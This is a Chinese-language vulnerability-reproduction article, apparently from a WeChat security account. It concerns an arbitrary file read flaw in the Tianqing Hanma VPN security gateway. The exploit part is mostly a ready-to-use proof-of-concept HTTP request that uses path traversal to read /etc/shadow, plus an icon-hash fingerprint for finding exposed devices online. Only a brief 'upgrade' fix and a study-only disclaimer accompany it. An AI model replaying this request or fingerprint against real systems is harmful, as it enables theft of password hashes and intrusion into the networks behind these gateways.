---
title: 天清汉马VPN安全网关系统任意文件读取漏洞 附POC
url: https://mp.weixin.qq.com/s/DLsDZqQSa5MhJXL8O8zCkg
source: Doonsec's feed
date: 2026-02-28
fetch_date: 2026-03-01T04:23:49.950415
---

# 天清汉马VPN安全网关系统任意文件读取漏洞 附POC

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lhp5P0lJibS1XSJ5qlRAXJqibvYyickyLR4stMsxvuaMNkgWicjPpHgKxp3F8Cq8CgZ0dkT13sxe8cxeoBBdvQMmx8iasl5CzwgAWIDCNPiatSFLs/0?wx_fmt=jpeg)

# 天清汉马VPN安全网关系统任意文件读取漏洞 附POC

原创

安服仔
安服仔

北风漏洞复现文库

![]()

在小说阅读器中沉浸阅读

免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。

#

01

—

漏洞名称

#

# 天清汉马VPN安全网关系统任意文件读取漏洞

#

02

—

影响版本

![](https://mmbiz.qpic.cn/sz_mmbiz_png/lhp5P0lJibS1tria0TTYt6ZA3R8bia8jENsjZyibIeyEOyHZJPqTsUjuQPRxHWaotDo1t92ibOrtiapvMvVVQOVRfupDyYT4yyreKNHm7mqj4PGuA/640?wx_fmt=png&from=appmsg)

![图片](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS2JLwfE95nFO5P4ES34pkvffzgicCjucoHxxFKjp6RibnasicUqQgFXONXGYW5j09CV2sSIDibKwicFncvFWOMA89QNRlN1zxFaYbVo/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0)

03

—

漏洞简介

天清汉马VPN安全网关系统是启明星辰集团旗下天清汉马品牌推出的网络安全设备，主要提供安全的远程接入和分支机构互联解决方案。天清汉马VPN安全网关系统的任意文件读取漏洞，是指攻击者可通过特定构造的请求，读取服务器上的敏感文件，如配置文件、账号密码等，从而获取系统权限或进一步渗透内网。

04

—

资产测绘

```
icon_hash="-15980305"
```

![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS3HtExpYWZQ8icrkwndp3G1Qh3u1aTTYUypf4ibqpIcxWIaGWVgdicicFInGxmd9flwNT61lOv2jeqv6ncYXsq457VEibqvslBn0Lx4/640?wx_fmt=png&from=appmsg)

05

—

漏洞复现

POC

```
GET /vpn/user/download/client?ostype=../../../../../../../etc/shadow HTTP/1.1Host: 127.0.0.1Connection: closesec-ch-ua-platform: "Windows"X-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36Accept: application/json, text/javascript, */*; q=0.01sec-ch-ua: "Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"sec-ch-ua-mobile: ?0Sec-Fetch-Site: same-originSec-Fetch-Mode: corsSec-Fetch-Dest: emptyAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: VSG_VERIFYCODE_CONF=0-0; VSG_CLIENT_RUNNING=false; VSG_LANGUAGE=zh_CN
```

![](https://mmbiz.qpic.cn/mmbiz_png/lhp5P0lJibS0H1a1nS8gB3AYI8rN6IicZXFtbGUoAng5ibxG5AO9F6NaICibqEQ4u8w11bHJlS99rhc2v9M89Qa3JiadKoasuvkqZUjdtlc33mqk/640?wx_fmt=png&from=appmsg)

06

—

修复建议

升级至最新版本

07

—

往期回顾

预览时标签不可点

修改于

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhLiaaoGI8LfuPiaA8ibUUtcv9nSuJJc1Pps7Ys43DOtfxA1zLlMExIyoJkyiaibxJBibUbupXrVXYyOn4vA/0?wx_fmt=png)

北风漏洞复现文库

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/dV0OibMDwBhLiaaoGI8LfuPiaA8ibUUtcv9nSuJJc1Pps7Ys43DOtfxA1zLlMExIyoJkyiaibxJBibUbupXrVXYyOn4vA/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过